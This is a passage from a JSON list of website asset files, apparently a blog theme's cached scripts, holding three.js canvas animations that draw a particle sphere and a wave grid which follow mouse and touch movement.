onDocumentMouseMove, false);\n    document.addEventListener('touchstart', onDocumentTouchStart, false);\n    document.addEventListener('touchmove', onDocumentTouchMove, false);\n    //\n    window.addEventListener('resize', onWindowResize, false);\n  }\n\n  function onWindowResize() {\n    windowHalfX = window.innerWidth / 2;\n    windowHalfY = window.innerHeight / 2;\n    camera.aspect = window.innerWidth / window.innerHeight;\n    camera.updateProjectionMatrix();\n    renderer.setSize(window.innerWidth, window.innerHeight);\n  }\n  //\n  function onDocumentMouseMove(event) {\n    mouseX = event.clientX - windowHalfX;\n    mouseY = event.clientY - windowHalfY;\n  }\n\n  function onDocumentTouchStart(event) {\n    if (event.touches.length > 1) {\n      //event.preventDefault();\n      mouseX = event.touches[0].pageX - windowHalfX;\n      //mouseY = event.touches[ 0 ].pageY - windowHalfY;\n    }\n  }\n\n  function onDocumentTouchMove(event) {\n    if (event.touches.length == 1) {\n      //event.preventDefault();\n      mouseX = event.touches[0].pageX - windowHalfX;\n      //mouseY = event.touches[ 0 ].pageY - windowHalfY;\n    }\n  }\n  //\n  function animate() {\n    requestAnimationFrame(animate);\n    render();\n  }\n\n  function render() {\n    camera.position.x += (mouseX - camera.position.x) * .05;\n    camera.position.y += (-mouseY + 200 - camera.position.y) * .05;\n    camera.lookAt(scene.position);\n    renderer.render(scene, camera);\n  }\n})"},{"url":"/lib/three/src/canvas_sphere.js","content":"/**\n * Created by Tang on 2017/4/15.\n */\n$(function () {\n  var SCREEN_WIDTH = window.innerWidth,\n    SCREEN_HEIGHT = window.innerHeight,\n    mouseX = 0,\n    mouseY = 0,\n    windowHalfX = window.innerWidth / 2,\n    windowHalfY = window.innerHeight / 2,\n    SEPARATION = 200,\n    AMOUNTX = 10,\n    AMOUNTY = 10,\n    camera, scene, renderer;\n  init();\n  animate();\n\n  function init() {\n    var container, separation = 100,\n      amountX = 50,\n      amountY = 50,\n      particles, particle;\n    container = document.createElement('div');\n    // è®¾ç½®css\n    container.style.position = \"fixed\";\n    container.style.top = \"0px\";\n    container.style.left = \"0px\";\n    container.style.zIndex = \"-1\";\n    container.style.opacity = \"0.5\";\n\n    document.body.appendChild(container);\n    camera = new THREE.PerspectiveCamera(75, SCREEN_WIDTH / SCREEN_HEIGHT, 1, 10000);\n    camera.position.z = 1000;\n    scene = new THREE.Scene();\n    renderer = new THREE.CanvasRenderer({\n      alpha: true\n    });\n    renderer.setPixelRatio(window.devicePixelRatio);\n    renderer.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);\n    container.appendChild(renderer.domElement);\n    // particles\n    var PI2 = Math.PI * 2;\n    var material = new THREE.SpriteCanvasMaterial({\n      color: 10263708,\n      program: function (context) {\n        context.beginPath();\n        context.arc(0, 0, 0.5, 0, PI2, true);\n        context.fill();\n      }\n    });\n    for (var i = 0; i < 1000; i++) {\n      particle = new THREE.Sprite(material);\n      particle.position.x = Math.random() * 2 - 1;\n      particle.position.y = Math.random() * 2 - 1;\n      particle.position.z = Math.random() * 2 - 1;\n      particle.position.normalize();\n      particle.position.multiplyScalar(Math.random() * 10 + 450);\n      particle.scale.multiplyScalar(2);\n      scene.add(particle);\n    }\n    // lines\n    for (var i = 0; i < 300; i++) {\n      var geometry = new THREE.Geometry();\n      var vertex = new THREE.Vector3(Math.random() * 2 - 1, Math.random() * 2 - 1, Math.random() * 2 - 1);\n      vertex.normalize();\n      vertex.multiplyScalar(450);\n      geometry.vertices.push(vertex);\n      var vertex2 = vertex.clone();\n      vertex2.multiplyScalar(Math.random() * 0.3 + 1);\n      geometry.vertices.push(vertex2);\n      var line = new THREE.Line(geometry, new THREE.LineBasicMaterial({\n        color: 10263708,\n        opacity: Math.random()\n      }));\n      scene.add(line);\n    }\n    document.addEventListener('mousemove', onDocumentMouseMove, false);\n    document.addEventListener('touchstart', onDocumentTouchStart, false);\n    document.addEventListener('touchmove', onDocumentTouchMove, false);\n    //\n    window.addEventListener('resize', onWindowResize, false);\n  }\n\n  function onWindowResize() {\n    windowHalfX = window.innerWidth / 2;\n    windowHalfY = window.innerHeight / 2;\n    camera.aspect = window.innerWidth / window.innerHeight;\n    camera.updateProjectionMatrix();\n    renderer.setSize(window.innerWidth, window.innerHeight);\n  }\n  //\n  function onDocumentMouseMove(event) {\n    mouseX = event.clientX - windowHalfX;\n    mouseY = event.clientY - windowHalfY;\n  }\n\n  function onDocumentTouchStart(event) {\n    if (event.touches.length > 1) {\n      //event.preventDefault();\n      mouseX = event.touches[0].pageX - windowHalfX;\n      //mouseY = event.touches[ 0 ].pageY - windowHalfY;\n    }\n  }\n\n  function onDocumentTouchMove(event) {\n    if (event.touches.length == 1) {\n      //event.preventDefault();\n      mouseX = event.touches[0].pageX - windowHalfX;\n      //mouseY = event.touches[ 0 ].pageY - windowHalfY;\n    }\n  }\n  //\n  function animate() {\n    requestAnimationFrame(animate);\n    render();\n  }\n\n  function render() {\n    camera.position.x += (mouseX - camera.position.x) * .05;\n    camera.position.y += (-mouseY + 200 - camera.position.y) * .05;\n    camera.lookAt(scene.position);\n    renderer.render(scene, camera);\n  }\n})"},{"url":"/lib/three/src/three-waves.js","content":"$(function () {\n  var SEPARATION = 100,\n    AMOUNTX = 50,\n    AMOUNTY = 50;\n  var container;\n  var camera, scene, renderer;\n  var particles, particle, count = 0;\n  var mouseX = 0,\n    mouseY = 0;\n  var windowHalfX = window.innerWidth / 2;\n  var windowHalfY = window.innerHeight / 2;\n  init();\n  animate();\n\n  function init() {\n    container = document.createElement(\"div\");\n    container.style.position = \"fixed\";\n    container.style.top = \"0px\";\n    container.style.left = \"0px\";\n    container.style.zIndex = \"-1\";\n    container.style.opacity = \"0.5\";\n    document.body.appendChild(container);\n    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 1, 10000);\n    camera.position.z = 1000;\n    scene = new THREE.Scene();\n    particles = new Array();\n    var PI2 = Math.PI * 2;\n    var material = new THREE.SpriteCanvasMaterial({\n      color: 10263708,\n      program: function (context) {\n        context.beginPath();\n        context.arc(0, 0, 0.5, 0, PI2, true);\n        context.fill()\n      }\n    });\n    var i = 0;\n    for (var ix = 0; ix < AMOUNTX; ix++) {\n      for (var iy = 0; iy < AMOUNTY; iy++) {\n        particle = particles[i++] = new THREE.Sprite(material);\n        particle.position.x = ix * SEPARATION - ((AMOUNTX * SEPARATION) / 2);\n        particle.position.z = iy * SEPARATION - ((AMOUNTY * SEPARATION) / 2);\n        scene.add(particle)\n      }\n    }\n    renderer = new THREE.CanvasRenderer({\n      alpha: true\n    });\n    renderer.setPixelRatio(window.devicePixelRatio);\n    renderer.setSize(window.innerWidth, window.innerHeight);\n    container.appendChild(renderer.domElement);\n    document.addEventListener(\"mousemove\", onDocumentMouseMove, false);\n    window.addEventListener(\"resize\", onWindowResize, false)\n  }\n\n  function onWindowResize() {\n    windowHalfX = window.innerWidth / 2;\n    windowHalfY = window.innerHeight / 2;\n    camera.aspect = window.innerWidth / window.innerHeight;\n    camera.updateProjectionMatrix();\n    renderer.setSize(window.innerWidth, window.innerHeight)\n  }\n\n  function onDocumentMouseMove(event) {\n    mouseX = event.clientX - windowHalfX\n  }\n\n  function animate() {\n    requestAnimationFrame(animate);\n    render()\n  }\n\n  function render() {\n    camera.position.x += (mouseX - camera.position.x) * 0.05;\n    camera.position.y = 362.05;\n    camera.lookAt({\n      x: scene.position.x,\n      y: window.innerHeight / 3,\n      z: scene.position.z\n    });\n    var i = 0;\n    for (var ix = 0; ix < AMOUNTX; ix++) {\n      for (var iy = 0; iy < AMOUNTY; iy++) {\n        particle = particles[i++];\n        particle.position.y = (Math.sin((ix + count) * 0.3) * 50) + (Math.sin((iy + count) * 0.5) * 50);\n        particle.scale.x = particle.scale.y = (Math.sin((ix + count) * 0.3) + 1) * 4 + (Math.sin((iy + count) * 0.5) + 1) * 4\n      }\n    }\n    renderer.render(scene, camera);\n    count += 0.1\n  }\n});"}]